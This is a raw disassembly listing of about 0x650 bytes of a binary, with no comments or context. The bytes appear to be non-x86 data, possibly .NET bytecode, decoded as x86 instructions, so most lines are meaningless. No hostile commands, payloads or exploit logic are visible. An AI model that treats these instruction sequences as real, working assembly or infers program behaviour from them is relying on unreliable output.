  403fc2:	add    BYTE PTR [eax],al
  403fc4:	add    al,0x2
  403fc6:	add    bh,BYTE PTR [ebx+0x3c]
  403fc9:	add    BYTE PTR [eax],al
  403fcb:	add    al,0x14
  403fcd:	outs   dx,DWORD PTR ds:[esi]
  403fce:	test   DWORD PTR [eax],0x3b7d0a00
  403fd4:	add    BYTE PTR [eax],al
  403fd6:	add    al,0x2
  403fd8:	jnp    0x404012
  403fda:	add    BYTE PTR [eax],al
  403fdc:	add    al,0x28
  403fde:	cwde   
  403fdf:	add    BYTE PTR [eax],al
  403fe1:	or     ch,BYTE PTR [esi+eiz*1]
  403fe4:	add    al,BYTE PTR [edx]
  403fe6:	jnp    0x40401d
  403fe8:	add    BYTE PTR [eax],al
  403fea:	add    al,0x2
  403fec:	jnp    0x404024
  403fee:	add    BYTE PTR [eax],al
  403ff0:	add    al,0x2
  403ff2:	jnp    0x40402b
  403ff4:	add    BYTE PTR [eax],al
  403ff6:	add    al,0x6
  403ff8:	add    bh,BYTE PTR [ebx+0x3b]
  403ffb:	add    BYTE PTR [eax],al
  403ffd:	add    al,0x73
  403fff:	clc    
  404000:	add    BYTE PTR [eax],al
  404002:	or     bh,BYTE PTR [ebp+0x39]
  404005:	add    BYTE PTR [eax],al
  404007:	add    al,0x2b
  404009:	pop    ds
  40400a:	add    al,BYTE PTR [edx]
  40400c:	jnp    0x404046
  40400e:	add    BYTE PTR [eax],al
  404010:	add    al,0x14
  404012:	add    bh,BYTE PTR [ebx+0x37]
  404015:	add    BYTE PTR [eax],al
  404017:	add    al,0x6
  404019:	add    bh,BYTE PTR [ebx+0x3b]
  40401c:	add    BYTE PTR [eax],al
  40401e:	add    al,0x73
  404020:	clc    
  404021:	add    BYTE PTR [eax],al
  404023:	or     bh,BYTE PTR [ebp+0x39]
  404026:	add    BYTE PTR [eax],al
  404028:	add    al,0x2
  40402a:	jnp    0x404065
  40402c:	add    BYTE PTR [eax],al
  40402e:	add    al,0x2
  404030:	inc    BYTE PTR [esi]
  404032:	nop
  404033:	add    BYTE PTR [eax],al
  404035:	push   es
  404036:	jae    0x404025
  404038:	add    BYTE PTR [eax],al
  40403a:	or     ch,BYTE PTR [edi-0x7]
  40403d:	add    BYTE PTR [eax],al
  40403f:	or     al,BYTE PTR [edx]
  404041:	jnp    0x40407c
  404043:	add    BYTE PTR [eax],al
  404045:	add    al,0x2
  404047:	inc    BYTE PTR [esi]
  404049:	xchg   ecx,eax
  40404a:	add    BYTE PTR [eax],al
  40404c:	push   es
  40404d:	jae    0x40403c
  40404f:	add    BYTE PTR [eax],al
  404051:	or     ch,BYTE PTR [edi-0x6]
  404054:	add    BYTE PTR [eax],al
  404056:	or     al,BYTE PTR [edx]
  404058:	jnp    0x404093
  40405a:	add    BYTE PTR [eax],al
  40405c:	add    al,0x2
  40405e:	inc    BYTE PTR [esi]
  404060:	pop    DWORD PTR [eax]
  404062:	add    BYTE PTR [esi],al
  404064:	jae    0x4040a0
  404066:	add    BYTE PTR [eax],al
  404068:	or     ch,BYTE PTR [edi-0x5]
  40406b:	add    BYTE PTR [eax],al
  40406d:	or     bl,dh
  40406f:	xor    DWORD PTR [ebx],ecx
  404071:	jae    0x40406f
  404073:	add    BYTE PTR [eax],al
  404075:	or     cl,BYTE PTR [eax+ecx*1]
  404078:	pop    es
  404079:	outs   dx,DWORD PTR ds:[esi]
  40407a:	std    
  40407b:	add    BYTE PTR [eax],al
  40407d:	or     ch,BYTE PTR [edi-0x2]
  404080:	add    BYTE PTR [eax],al
  404082:	or     cl,BYTE PTR [eax]
  404084:	pop    es
  404085:	outs   dx,DWORD PTR ds:[esi]
  404086:	inc    DWORD PTR [eax]
  404088:	add    BYTE PTR [edx],cl
  40408a:	outs   dx,DWORD PTR ds:[esi]
  40408b:	iret   
  40408c:	add    BYTE PTR [eax],al
  40408e:	or     ch,BYTE PTR [edi+0x0]
  404091:	add    DWORD PTR [eax],eax
  404093:	or     cl,BYTE PTR [eax]
  404095:	pop    es
  404096:	outs   dx,DWORD PTR ds:[esi]
  404097:	std    
  404098:	add    BYTE PTR [eax],al
  40409a:	or     dh,BYTE PTR [ebx+0x1]
  40409d:	add    DWORD PTR [eax],eax
  40409f:	or     bh,BYTE PTR [edx+0x2a]
  4040a2:	add    BYTE PTR [eax],al
  4040a4:	inc    ecx
  4040a5:	sbb    al,0x0
  4040a7:	add    BYTE PTR [eax],al
  4040a9:	add    BYTE PTR [eax],al
  4040ab:	add    BYTE PTR [esi],bh
  4040ad:	add    BYTE PTR [eax],al
  4040af:	add    BYTE PTR [edx],bh
  4040b1:	add    DWORD PTR [eax],eax
  4040b3:	add    BYTE PTR [eax+0x1],bh
  4040b6:	add    BYTE PTR [eax],al
  4040b8:	xor    DWORD PTR [eax],eax
  4040ba:	add    BYTE PTR [eax],al
  4040bc:	add    BYTE PTR ss:[eax],al
  4040bf:	add    DWORD PTR [ebx],ebx
  4040c1:	xor    BYTE PTR [edx],al
  4040c3:	add    BYTE PTR [edi],ah
  4040c5:	add    BYTE PTR [eax],al
  4040c7:	add    BYTE PTR [eax],ch
  4040c9:	add    BYTE PTR [eax],al
  4040cb:	adc    DWORD PTR [esi],edx
  4040cd:	or     al,BYTE PTR [edx]
  4040cf:	jnp    0x40410a
  4040d1:	add    BYTE PTR [eax],al
  4040d3:	add    al,0x2d
  4040d5:	add    edx,DWORD PTR [esi]
  4040d7:	sub    ecx,DWORD PTR [ebx]
  4040d9:	add    bh,BYTE PTR [ebx+0x39]
  4040dc:	add    BYTE PTR [eax],al
  4040de:	add    al,0x6f
  4040e0:	add    al,BYTE PTR [ecx]
  4040e2:	add    BYTE PTR [edx],cl
  4040e4:	or     bl,dh
  4040e6:	or     cl,BYTE PTR [ebx]
  4040e8:	add    al,BYTE PTR [edi]
  4040ea:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  4040f1:	push   es
  4040f2:	sub    al,BYTE PTR [eax]
  4040f4:	add    DWORD PTR [eax],edx
  4040f6:	add    BYTE PTR [eax],al
  4040f8:	add    BYTE PTR [eax],al
  4040fa:	add    al,BYTE PTR [eax]
  4040fc:	sbb    DWORD PTR [ebx],ebx
  4040fe:	add    BYTE PTR [edx],cl
  404100:	add    BYTE PTR ss:[eax],al
  404103:	add    DWORD PTR [ebx],ebx
  404105:	xor    BYTE PTR [edx],al
  404107:	add    BYTE PTR [edi],ah
  404109:	add    BYTE PTR [eax],al
  40410b:	add    BYTE PTR [eax],ch
  40410d:	add    BYTE PTR [eax],al
  40410f:	adc    DWORD PTR [esi],edx
  404111:	or     al,BYTE PTR [edx]
  404113:	jnp    0x40414e
  404115:	add    BYTE PTR [eax],al
  404117:	add    al,0x2d
  404119:	add    edx,DWORD PTR [edi]
  40411b:	sub    ecx,DWORD PTR [ebx]
  40411d:	add    bh,BYTE PTR [ebx+0x39]
  404120:	add    BYTE PTR [eax],al
  404122:	add    al,0x6f
  404124:	add    eax,DWORD PTR [ecx]
  404126:	add    BYTE PTR [edx],cl
  404128:	or     bl,dh
  40412a:	or     cl,BYTE PTR [ebx]
  40412c:	add    al,BYTE PTR [edi]
  40412e:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  404135:	push   es
  404136:	sub    al,BYTE PTR [eax]
  404138:	add    DWORD PTR [eax],edx
  40413a:	add    BYTE PTR [eax],al
  40413c:	add    BYTE PTR [eax],al
  40413e:	add    al,BYTE PTR [eax]
  404140:	sbb    DWORD PTR [ebx],ebx
  404142:	add    BYTE PTR [edx],cl
  404144:	add    BYTE PTR ss:[eax],al
  404147:	add    DWORD PTR [ebx],ebx
  404149:	xor    BYTE PTR [edx],al
  40414b:	add    BYTE PTR [ebx],ch
  40414d:	add    BYTE PTR [eax],al
  40414f:	add    BYTE PTR [ecx],ch
  404151:	add    BYTE PTR [eax],al
  404153:	adc    DWORD PTR [edx+ecx*1],edx
  404156:	add    bh,BYTE PTR [ebx+0x39]
  404159:	add    BYTE PTR [eax],al
  40415b:	add    al,0x2d
  40415d:	pop    es
  40415e:	jb     0x404104
  404160:	add    al,BYTE PTR [eax]
  404162:	jo     0x40418f
  404164:	or     eax,DWORD PTR [edx]
  404166:	jnp    0x4041a1
  404168:	add    BYTE PTR [eax],al
  40416a:	add    al,0x6f
  40416c:	add    al,0x1
  40416e:	add    BYTE PTR [edx],cl
  404170:	or     bl,dh
  404172:	or     cl,BYTE PTR [ebx]
  404174:	add    al,BYTE PTR [edi]
  404176:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  40417d:	push   es
  40417e:	sub    al,BYTE PTR [eax]
  404180:	add    DWORD PTR [eax],edx
  404182:	add    BYTE PTR [eax],al
  404184:	add    BYTE PTR [eax],al
  404186:	add    al,BYTE PTR [eax]
  404188:	sbb    eax,0x360a001f
  40418d:	add    BYTE PTR [eax],al
  40418f:	add    DWORD PTR [ebx],ebx
  404191:	xor    BYTE PTR ds:0x12000,al
  404197:	add    BYTE PTR [edx],ch
  404199:	add    BYTE PTR [eax],al
  40419b:	adc    DWORD PTR [esp+edx*1],eax
  40419e:	push   ecx
  40419f:	add    eax,0x40e5114
  4041a4:	adc    al,0x51
  4041a6:	push   cs
  4041a7:	add    eax,0x60e5114
  4041ac:	adc    al,0x51
  4041ae:	add    bh,BYTE PTR [ebx+0x39]
  4041b1:	add    BYTE PTR [eax],al
  4041b3:	add    al,0x2d
  4041b5:	sub    dh,BYTE PTR [ebx-0x4]
  4041b8:	add    BYTE PTR [eax],al
  4041ba:	or     dl,BYTE PTR [ebx]
  4041bc:	pop    es
  4041bd:	adc    DWORD PTR [edi],eax
  4041bf:	sar    BYTE PTR [ecx+0x28010000],1
  4041c5:	inc    esi
  4041c6:	add    BYTE PTR [eax],al
  4041c8:	or     ch,BYTE PTR [edi-0x31]
  4041cb:	add    BYTE PTR [eax],al
  4041cd:	or     ch,BYTE PTR [edi+0x0]
  4041d0:	add    DWORD PTR [eax],eax
  4041d2:	or     dl,BYTE PTR [ecx]
  4041d4:	pop    es
  4041d5:	jb     0x40417b
  4041d7:	add    al,BYTE PTR [eax]
  4041d9:	jo     0x40424e
  4041db:	add    DWORD PTR [ecx],eax
  4041dd:	add    BYTE PTR [edx],cl
  4041df:	jp     0x4041e3
  4041e1:	jnp    0x40421c
  4041e3:	add    BYTE PTR [eax],al
  4041e5:	add    al,0x3
  4041e7:	adc    al,BYTE PTR [eax]
  4041e9:	add    eax,0x56f040e
  4041ee:	add    DWORD PTR [eax],eax
  4041f0:	or     al,BYTE PTR [esi]
  4041f2:	adc    al,0x28
  4041f4:	push   es
  4041f5:	add    DWORD PTR [eax],eax
  4041f7:	or     ch,BYTE PTR [eax+ecx*1]
  4041fa:	add    al,0x6
  4041fc:	outs   dx,DWORD PTR ds:[esi]
  4041fd:	pop    es
  4041fe:	add    DWORD PTR [eax],eax
  404200:	or     dl,BYTE PTR [ecx+0x73]
  404203:	jge    0x404205
  404205:	add    BYTE PTR [edx],cl
  404207:	or     esi,DWORD PTR [ebx+0x7d]
  40420a:	add    BYTE PTR [eax],al
  40420c:	or     cl,BYTE PTR [esi+ecx*1]
  40420f:	add    al,0x50
  404211:	sub    BYTE PTR [eax],cl
  404213:	add    DWORD PTR [eax],eax
  404215:	or     cl,BYTE PTR ds:0x816f09
  40421b:	add    BYTE PTR [edx],cl
  40421d:	adc    ecx,DWORD PTR [eax]
  40421f:	sub    esp,DWORD PTR [ebx+0x11]
  404222:	or     BYTE PTR [edi-0x7e],ch
  404225:	add    BYTE PTR [eax],al
  404227:	or     dl,BYTE PTR [ebx]
  404229:	add    al,0x2
  40422b:	jnp    0x404266
  40422d:	add    BYTE PTR [eax],al
  40422f:	add    al,0x11
  404231:	add    al,0x6f
  404233:	or     DWORD PTR [ecx],eax
  404235:	add    BYTE PTR [edx],cl
  404237:	adc    eax,DWORD PTR ds:0x7b020511
  40423d:	xor    eax,0x6f040000
  404242:	or     al,BYTE PTR [ecx]
  404244:	add    BYTE PTR [edx],cl
  404246:	sub    al,0x14
  404248:	adc    DWORD PTR ds:0x357b02,eax
  40424e:	add    BYTE PTR [edi+ebp*2],al
  404251:	daa    
  404252:	add    BYTE PTR [eax],al
  404254:	or     ch,BYTE PTR [edi+0xb]
  404257:	add    DWORD PTR [eax],eax
  404259:	or     dl,BYTE PTR [ebx]
  40425b:	add    eax,0xd6720511
  404260:	add    al,0x0
  404262:	jo     0x4042d3
  404264:	or     al,BYTE PTR [ecx]
  404266:	add    BYTE PTR [edx],cl
  404268:	sub    al,0xa
  40426a:	adc    DWORD PTR ds:0x10b6f17,eax
  404270:	add    BYTE PTR [edx],cl
  404272:	adc    eax,DWORD PTR ds:0x6f051107
  404278:	or     al,0x1
  40427a:	add    BYTE PTR [edx],cl
  40427c:	or     BYTE PTR [ecx],dl
  40427e:	add    al,0x6f
  404280:	or     al,0x1
  404282:	add    BYTE PTR [edx],cl
  404284:	adc    DWORD PTR [eax],ecx
  404286:	outs   dx,DWORD PTR ds:[esi]
  404287:	test   BYTE PTR [eax],al
  404289:	add    BYTE PTR [edx],cl
  40428b:	sub    eax,0x110cde94
  404290:	or     BYTE PTR [edi+eax*1],ch
  404293:	adc    DWORD PTR [eax],ecx
  404295:	outs   dx,DWORD PTR ds:[esi]
  404296:	inc    ebx
  404297:	add    BYTE PTR [eax],al
  404299:	or     bl,ah
  40429b:	push   cs
  40429c:	add    eax,0x10d6f07
  4042a1:	add    BYTE PTR [edx],cl
  4042a3:	push   ecx
  4042a4:	push   cs
  4042a5:	push   es
  4042a6:	or     BYTE PTR [edi+0xd],ch
  4042a9:	add    DWORD PTR [eax],eax
  4042ab:	or     dl,BYTE PTR [ecx-0x22]
  4042ae:	or     al,0x13
  4042b0:	push   es
  4042b1:	add    dl,BYTE PTR [ecx]
  4042b3:	push   es
  4042b4:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  4042bb:	sub    al,BYTE PTR [ecx]
  4042bd:	sbb    al,0x0
  4042bf:	add    BYTE PTR [edx],al
  4042c1:	add    BYTE PTR [ebx+0xf37000],al
  4042c7:	or     al,0x0
  4042c9:	add    BYTE PTR [eax],al
  4042cb:	add    BYTE PTR [eax],al
  4042cd:	add    BYTE PTR [eax+eax*1-0x31],al
  4042d1:	adc    eax,DWORD PTR [ecx]
  4042d3:	or     al,0x36
  4042d5:	add    BYTE PTR [eax],al
  4042d7:	add    DWORD PTR [ebx],ebx
  4042d9:	xor    BYTE PTR [esi],al
  4042db:	add    BYTE PTR [eax+0x0],ch
  4042de:	add    BYTE PTR [eax],al
  4042e0:	sub    eax,DWORD PTR [eax]
  4042e2:	add    BYTE PTR [ecx],dl
  4042e4:	add    eax,0x40e5114
  4042e9:	adc    al,0x51
  4042eb:	add    bh,BYTE PTR [ebx+0x39]
  4042ee:	add    BYTE PTR [eax],al
  4042f0:	add    al,0x2d
  4042f2:	daa    
  4042f3:	jae    0x4042f1
  4042f5:	add    BYTE PTR [eax],al
  4042f7:	or     cl,BYTE PTR ds:0xb9d009
  4042fd:	add    BYTE PTR [ecx],al
  4042ff:	sub    BYTE PTR [esi+0x0],al
  404302:	add    BYTE PTR [edx],cl
  404304:	outs   dx,DWORD PTR ds:[esi]
  404305:	iret   
  404306:	add    BYTE PTR [eax],al
  404308:	or     ch,BYTE PTR [edi+0x0]
  40430b:	add    DWORD PTR [eax],eax
  40430d:	or     cl,BYTE PTR [ecx]
  40430f:	jb     0x4042b5
  404311:	add    al,BYTE PTR [eax]
  404313:	jo     0x404388
  404315:	add    DWORD PTR [ecx],eax
  404317:	add    BYTE PTR [edx],cl
  404319:	jp     0x40431d
  40431b:	jnp    0x404356
  40431d:	add    BYTE PTR [eax],al
  40431f:	add    al,0x3
  404321:	add    al,0x12
  404323:	add    DWORD PTR [esi],ecx
  404325:	add    al,0x12
  404327:	add    BYTE PTR [edi+0xe],ch
  40432a:	add    DWORD PTR [eax],eax
  40432c:	or     ah,BYTE PTR [esi]
  40432e:	pop    es
  40432f:	adc    al,0x28
  404331:	push   es
  404332:	add    DWORD PTR [eax],eax
  404334:	or     ch,BYTE PTR [eax+ecx*1]
  404337:	add    eax,0x1076f07
  40433c:	add    BYTE PTR [edx],cl
  40433e:	push   ecx
  40433f:	fimul  WORD PTR [edx]
  404341:	or     al,0x2
  404343:	or     BYTE PTR [eax],ch
  404345:	mov    WORD PTR [eax],es
  404347:	add    BYTE PTR [esi],al
  404349:	fiadd  WORD PTR [eax]
  40434b:	sub    al,BYTE PTR [ecx]
  40434d:	adc    BYTE PTR [eax],al
  40434f:	add    BYTE PTR [eax],al
  404351:	add    BYTE PTR [esi],dh
  404353:	add    BYTE PTR [edi],ah
  404355:	pop    ebp
  404356:	add    BYTE PTR [edx],cl
  404358:	add    BYTE PTR ss:[eax],al
  40435b:	add    DWORD PTR [ebx],ebx
  40435d:	xor    BYTE PTR ds:0x12d00,al
  404363:	add    BYTE PTR [eax+eax*1],ch
  404366:	add    BYTE PTR [ecx],dl
  404368:	add    eax,0x40e5114
  40436d:	adc    al,0x51
  40436f:	add    bh,BYTE PTR [ebx+0x39]
  404372:	add    BYTE PTR [eax],al
  404374:	add    al,0x2d
  404376:	sub    dh,BYTE PTR [ebx-0x4]
  404379:	add    BYTE PTR [eax],al
  40437b:	or     dl,BYTE PTR [ebx]
  40437d:	push   es
  40437e:	adc    DWORD PTR [esi],eax
  404380:	sar    BYTE PTR [ecx+0x28010000],1
  404386:	inc    esi
  404387:	add    BYTE PTR [eax],al
  404389:	or     ch,BYTE PTR [edi-0x31]
  40438c:	add    BYTE PTR [eax],al
  40438e:	or     ch,BYTE PTR [edi+0x0]
  404391:	add    DWORD PTR [eax],eax
  404393:	or     dl,BYTE PTR [ecx]
  404395:	push   es
  404396:	jb     0x40433c
  404398:	add    al,BYTE PTR [eax]
  40439a:	jo     0x40440f
  40439c:	add    DWORD PTR [ecx],eax
  40439e:	add    BYTE PTR [edx],cl
  4043a0:	jp     0x4043b6
  4043a2:	or     al,BYTE PTR ds:0x397b02
  4043a8:	add    BYTE PTR [ebx+eax*1],al
  4043ab:	add    al,0x12
  4043ad:	add    BYTE PTR [edi+0xf],ch
  4043b0:	add    DWORD PTR [eax],eax
  4043b2:	or     dl,BYTE PTR [ecx+0x6]
  4043b5:	cmp    esp,ecx
  4043b7:	add    BYTE PTR [eax],al
  4043b9:	add    BYTE PTR [esi],al
  4043bb:	outs   dx,DWORD PTR ds:[esi]
  4043bc:	adc    BYTE PTR [ecx],al
  4043be:	add    BYTE PTR [edx],cl
  4043c0:	push   ss
  4043c1:	rol    BYTE PTR ds:[eax],0x0
  4043c5:	add    BYTE PTR [esi],cl
  4043c7:	add    al,0x6
  4043c9:	outs   dx,DWORD PTR ds:[esi]
  4043ca:	adc    BYTE PTR [ecx],al
  4043cc:	add    BYTE PTR [edx],cl
  4043ce:	lea    edi,[esi]
  4043d0:	add    BYTE PTR [eax],al
  4043d2:	add    DWORD PTR [ecx+0x16],edx
  4043d5:	or     eax,DWORD PTR [esi]
  4043d7:	outs   dx,DWORD PTR ds:[esi]
  4043d8:	adc    DWORD PTR [ecx],eax
  4043da:	add    BYTE PTR [edx],cl
  4043dc:	adc    eax,DWORD PTR [edi]
  4043de:	cmp    BYTE PTR [eax+0x11000000],al
  4043e4:	pop    es
  4043e5:	outs   dx,DWORD PTR ds:[esi]
  4043e6:	xchg   ebx,eax
  4043e7:	add    BYTE PTR [eax],al
  4043e9:	or     ah,BYTE PTR [ebp+0x10000bf]
  4043ef:	or     al,0x12
  4043f1:	add    ch,BYTE PTR [eax]
  4043f3:	adc    al,BYTE PTR [ecx]
  4043f5:	add    BYTE PTR [edx],cl
  4043f7:	je     0x4043b9
  4043f9:	add    BYTE PTR [eax],al
  4043fb:	add    DWORD PTR ds:0x750040e,ecx
  404401:	jae    0x404416
  404403:	add    DWORD PTR [eax],eax
  404405:	or     dl,BYTE PTR [ebx]
  404407:	add    al,0x11
  404409:	add    al,0x9
  40440b:	outs   dx,DWORD PTR ds:[esi]
  40440c:	adc    al,0x1
  40440e:	add    BYTE PTR [edx],cl
  404410:	outs   dx,DWORD PTR ds:[esi]
  404411:	adc    eax,0x110a0001
  404416:	add    al,0x9
  404418:	outs   dx,DWORD PTR ds:[esi]
  404419:	push   ss
  40441a:	add    DWORD PTR [eax],eax
  40441c:	or     ch,BYTE PTR [edi+0x17]
  40441f:	add    DWORD PTR [eax],eax
  404421:	or     dl,BYTE PTR [ecx]
  404423:	add    al,0x12
  404425:	add    ch,BYTE PTR [eax]
  404427:	sbb    BYTE PTR [ecx],al
  404429:	add    BYTE PTR [edx],cl
  40442b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40442c:	jle    0x40442e
  40442e:	add    BYTE PTR [ecx],al
  404430:	outs   dx,DWORD PTR ds:[esi]
  404431:	sbb    DWORD PTR [ecx],eax
  404433:	add    BYTE PTR [edx],cl
  404435:	adc    DWORD PTR [ecx+ecx*1],eax
  404438:	outs   dx,DWORD PTR ds:[esi]
  404439:	sbb    al,BYTE PTR [ecx]
  40443b:	add    BYTE PTR [edx],cl
  40443d:	outs   dx,DWORD PTR ds:[esi]
  40443e:	sbb    eax,DWORD PTR [ecx]
  404440:	add    BYTE PTR [edx],cl
  404442:	adc    DWORD PTR [ecx+ecx*1],eax
  404445:	outs   dx,DWORD PTR ds:[esi]
  404446:	sbb    al,0x1
  404448:	add    BYTE PTR [edx],cl
  40444a:	outs   dx,DWORD PTR ds:[esi]
  40444b:	sbb    eax,0x110a0001
  404450:	add    al,0x9
  404452:	outs   dx,DWORD PTR ds:[esi]
  404453:	push   ds
  404454:	add    DWORD PTR [eax],eax
  404456:	or     ch,BYTE PTR [edi+0x1f]
  404459:	add    DWORD PTR [eax],eax
  40445b:	or     dl,BYTE PTR [ecx]
  40445d:	add    al,0xa2
  40445f:	pop    es
  404460:	pop    ss
  404461:	pop    eax
  404462:	or     edx,DWORD PTR [ecx]
  404464:	pop    es
  404465:	outs   dx,DWORD PTR ds:[esi]
  404466:	test   BYTE PTR [eax],al
  404468:	add    BYTE PTR [edx],cl
  40446a:	cmp    dh,BYTE PTR [edi+edi*8-0x1]
  40446e:	(bad)  
  40446f:	ficom  WORD PTR ds:0x12750711
  404475:	add    BYTE PTR [eax],al
  404477:	add    DWORD PTR [ebx],edx
  404479:	or     BYTE PTR [ecx],dl
  40447b:	or     BYTE PTR [edi+eax*1],ch
  40447e:	adc    DWORD PTR [eax],ecx
  404480:	outs   dx,DWORD PTR ds:[esi]
  404481:	inc    ebx
  404482:	add    BYTE PTR [eax],al
  404484:	or     bl,ah
  404486:	fimul  WORD PTR [ebx+edx*1]
  404489:	add    eax,0x28051102
  40448e:	mov    WORD PTR [eax],es
  404490:	add    BYTE PTR [esi],al
  404492:	fiadd  WORD PTR [eax]
  404494:	sub    al,BYTE PTR [eax]
  404496:	add    BYTE PTR [eax],al
  404498:	add    DWORD PTR [eax+eax*1],ebx
  40449b:	add    BYTE PTR [edx],al
  40449d:	add    BYTE PTR [esi+0x0],dh
  4044a0:	xchg   ebx,eax
  4044a1:	or     DWORD PTR [ecx],eax
  4044a3:	adc    eax,0x0
  4044a8:	add    BYTE PTR [eax],al
  4044aa:	cmp    DWORD PTR [eax],eax
  4044ac:	out    0x20,eax
  4044ae:	add    DWORD PTR [esi+esi*1],ecx
  4044b1:	add    BYTE PTR [eax],al
  4044b3:	add    DWORD PTR [ebx],ebx
  4044b5:	xor    BYTE PTR [edx],al
  4044b7:	add    BYTE PTR [eax+0x0],dh
  4044ba:	add    BYTE PTR [eax],al
  4044bc:	sub    eax,0x2110000
  4044c1:	jnp    0x4044fc
  4044c3:	add    BYTE PTR [eax],al
  4044c5:	add    al,0x2d
  4044c7:	daa    
  4044c8:	jae    0x4044c6
  4044ca:	add    BYTE PTR [eax],al
  4044cc:	or     cl,BYTE PTR [eax+ecx*1]
  4044cf:	sar    BYTE PTR [ecx+0x28010000],1
  4044d5:	inc    esi
  4044d6:	add    BYTE PTR [eax],al
  4044d8:	or     ch,BYTE PTR [edi-0x31]
  4044db:	add    BYTE PTR [eax],al
  4044dd:	or     ch,BYTE PTR [edi+0x0]
  4044e0:	add    DWORD PTR [eax],eax
  4044e2:	or     cl,BYTE PTR [eax]
  4044e4:	jb     0x40448a
  4044e6:	add    al,BYTE PTR [eax]
  4044e8:	jo     0x40455d
  4044ea:	add    DWORD PTR [ecx],eax
  4044ec:	add    BYTE PTR [edx],cl
  4044ee:	jp     0x404504
  4044f0:	or     al,BYTE PTR [edx]
  4044f2:	jnp    0x40452d
  4044f4:	add    BYTE PTR [eax],al
  4044f6:	add    al,0x3
  4044f8:	outs   dx,DWORD PTR ds:[esi]
  4044f9:	and    BYTE PTR [ecx],al
  4044fb:	add    BYTE PTR [edx],cl
  4044fd:	or     al,BYTE PTR [edx]
  4044ff:	jnp    0x40453f
  404501:	add    BYTE PTR [eax],al
  404503:	add    al,0x6f
  404505:	xor    BYTE PTR [eax],al
  404507:	add    BYTE PTR [esi],al
  404509:	sub    BYTE PTR [eax+0x2c0a0000],bl
  40450f:	push   es
  404510:	jae    0x404533
  404512:	add    DWORD PTR [eax],eax
  404514:	or     bh,BYTE PTR [edx+0x2]
  404517:	jnp    0x404557
  404519:	add    BYTE PTR [eax],al
  40451b:	add    al,0x6
  40451d:	outs   dx,DWORD PTR ds:[esi]
  40451e:	dec    eax
  40451f:	add    BYTE PTR [eax],al
  404521:	push   es
  404522:	fimul  WORD PTR [edx]
  404524:	or     eax,DWORD PTR [edx]
  404526:	pop    es
  404527:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  40452e:	push   es
  40452f:	sub    al,BYTE PTR [ecx]
  404531:	adc    BYTE PTR [eax],al
  404533:	add    BYTE PTR [eax],al
  404535:	add    BYTE PTR [ecx],dh
  404537:	add    BYTE PTR [ebx],dh
  404539:	add    BYTE PTR fs:[edx],cl
  40453c:	add    BYTE PTR ss:[eax],al
  40453f:	add    DWORD PTR [ebx],ebx
  404541:	xor    BYTE PTR [edx],al
  404543:	add    BYTE PTR [ebx+0x0],cl
  404546:	add    BYTE PTR [eax],al
  404548:	sub    eax,0x2110000
  40454d:	jnp    0x404588
  40454f:	add    BYTE PTR [eax],al
  404551:	add    al,0x2d
  404553:	daa    
  404554:	jae    0x404552
  404556:	add    BYTE PTR [eax],al
  404558:	or     cl,BYTE PTR [eax+ecx*1]
  40455b:	sar    BYTE PTR [ecx+0x28010000],1
  404561:	inc    esi
  404562:	add    BYTE PTR [eax],al
  404564:	or     ch,BYTE PTR [edi-0x31]
  404567:	add    BYTE PTR [eax],al
  404569:	or     ch,BYTE PTR [edi+0x0]
  40456c:	add    DWORD PTR [eax],eax
  40456e:	or     cl,BYTE PTR [eax]
  404570:	jb     0x404516
  404572:	add    al,BYTE PTR [eax]
  404574:	jo     0x4045e9
  404576:	add    DWORD PTR [ecx],eax
  404578:	add    BYTE PTR [edx],cl
  40457a:	jp     0x404590
  40457c:	or     al,BYTE PTR [edx]
  40457e:	jnp    0x4045b9
  404580:	add    BYTE PTR [eax],al
  404582:	add    al,0x6f
  404584:	and    al,BYTE PTR [ecx]
  404586:	add    BYTE PTR [edx],cl
  404588:	or     bl,dh
  40458a:	or     cl,BYTE PTR [ebx]
  40458c:	add    al,BYTE PTR [edi]
  40458e:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  404595:	push   es
  404596:	sub    al,BYTE PTR [eax]
  404598:	add    DWORD PTR [eax],edx
  40459a:	add    BYTE PTR [eax],al
  40459c:	add    BYTE PTR [eax],al
  40459e:	xor    DWORD PTR [eax],eax
  4045a0:	push   cs
  4045a1:	aas    
  4045a2:	add    BYTE PTR [edx],cl
  4045a4:	add    BYTE PTR ss:[eax],al
  4045a7:	add    DWORD PTR [ebx],ebx
  4045a9:	xor    BYTE PTR [edx],al
  4045ab:	add    BYTE PTR [eax+eax*1+0x0],cl
  4045af:	add    BYTE PTR [esi],ch
  4045b1:	add    BYTE PTR [eax],al
  4045b3:	adc    DWORD PTR [edx],eax
  4045b5:	jnp    0x4045f0
  4045b7:	add    BYTE PTR [eax],al
  4045b9:	add    al,0x2d
  4045bb:	daa    
  4045bc:	jae    0x4045ba
  4045be:	add    BYTE PTR [eax],al
  4045c0:	or     cl,BYTE PTR [eax+ecx*1]
  4045c3:	sar    BYTE PTR [ecx+0x28010000],1
  4045c9:	inc    esi
  4045ca:	add    BYTE PTR [eax],al
  4045cc:	or     ch,BYTE PTR [edi-0x31]
  4045cf:	add    BYTE PTR [eax],al
  4045d1:	or     ch,BYTE PTR [edi+0x0]
  4045d4:	add    DWORD PTR [eax],eax
  4045d6:	or     cl,BYTE PTR [eax]
  4045d8:	jb     0x40457e
  4045da:	add    al,BYTE PTR [eax]
  4045dc:	jo     0x404651
  4045de:	add    DWORD PTR [ecx],eax
  4045e0:	add    BYTE PTR [edx],cl
  4045e2:	jp     0x4045fa
  4045e4:	or     al,BYTE PTR [edx]
  4045e6:	jnp    0x404621
  4045e8:	add    BYTE PTR [eax],al
  4045ea:	add    al,0x3
  4045ec:	outs   dx,DWORD PTR ds:[esi]
  4045ed:	and    eax,DWORD PTR [ecx]
  4045ef:	add    BYTE PTR [edx],cl
  4045f1:	or     bl,dh
  4045f3:	or     cl,BYTE PTR [ebx]
  4045f5:	add    al,BYTE PTR [edi]
  4045f7:	sub    BYTE PTR [eax+eax*1+0xde0600],cl
  4045fe:	push   es
  4045ff:	sub    al,BYTE PTR [ecx]
  404601:	adc    BYTE PTR [eax],al
  404603:	add    BYTE PTR [eax],al
  404605:	add    BYTE PTR [ecx],dh
  404607:	add    BYTE PTR [edi],cl
  404609:	inc    eax
  40460a:	add    BYTE PTR [edx],cl
  40460c:	add    BYTE PTR ss:[eax],al
